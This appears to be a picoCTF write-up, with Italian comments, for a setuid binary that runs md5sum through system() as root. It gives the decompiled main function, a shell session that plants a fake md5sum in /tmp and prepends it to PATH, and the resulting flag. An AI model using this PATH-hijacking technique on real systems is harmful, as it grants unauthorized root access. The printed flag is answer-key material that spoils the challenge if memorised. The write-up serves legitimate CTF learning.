@@ -1,0 +1,69 @@
+00401329    int32_t main(int32_t argc, char** argv, char** envp)
+
+00401329    {
+00401329        void* fsbase;
+00401336        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
+0040137d        std::ostream::operator<<(
+0040137d            std::ostream::operator<<(
+0040137d                std::operator<<<std::char_traits<char> >(&std::cout, 
+0040137d                    "Computing the MD5 hash of /root/flag.txt.... "), 
+0040137d                std::endl<char>), 
+0040137d            std::endl<char>);
+00401387        sleep(2);
+00401393        class std::allocator<char> var_4d;
+00401393        std::allocator<char>::allocator(&var_4d);
+004013aa        class std::string var_48;
+004013aa        std::string::string(&var_48, "/bin/bash -c 'md5sum /root/flag.txt'"); <------ andiamo a colpire qui
+004013b6        std::allocator<char>::~allocator(&var_4d);
+004013c0        setgid(0);
+004013ca        setuid(0);
+004013de        int32_t __n = system(std::string::c_str(&var_48));
+004013ea        int32_t result;
+004013ea        
+004013ea        if (!__n)
+0040142b            result = 0;
+004013ea        else
+004013ea        {
+0040141f            std::ostream::operator<<(
+0040141f                std::ostream::operator<<(
+0040141f                    std::operator<<<std::char_traits<char> >(&std::cerr, 
+0040141f                        "Error: system() call returned non-zero value: "), 
+0040141f                    __n), 
+0040141f                std::endl<char>);
+00401424            result = 1;
+004013ea        }
+004013ea        
+00401437        std::string::~string(&var_48);
+00401437        
+0040144b        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
+00401496            return result;
+00401496        
+0040148b        __stack_chk_fail();
+0040148b        /* no return */
+00401329    }
+
+------------------------------------------------------------------------------------------------------
+
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ cd tmp
+ctf-player@pico-chall$ ls
+ctf-player@pico-chall$ printf '#!/bin/bash\ncat /root/flag.txt\n' > md5sum
+ctf-player@pico-chall$ ls
+md5sum
+ctf-player@pico-chall$ chmod +x md5sum
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ cd home
+ctf-player@pico-chall$ cd ctf-player/
+ctf-player@pico-chall$ export PATH=/tmp:$PATH
+ctf-player@pico-chall$ ./flaghasher
+Computing the MD5 hash of /root/flag.txt....
+
+picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}
+
+------------------------------------------------------------------------------------------------------
+
+visto che ci è stato dato accesso con ssh alla macchina abbiamo modificato il path (path hijacking) per far eseguire il nostro binario personalizzato
+('#!/bin/bash\ncat /root/flag.txt\n')
+al posto del comando md5sum reale.
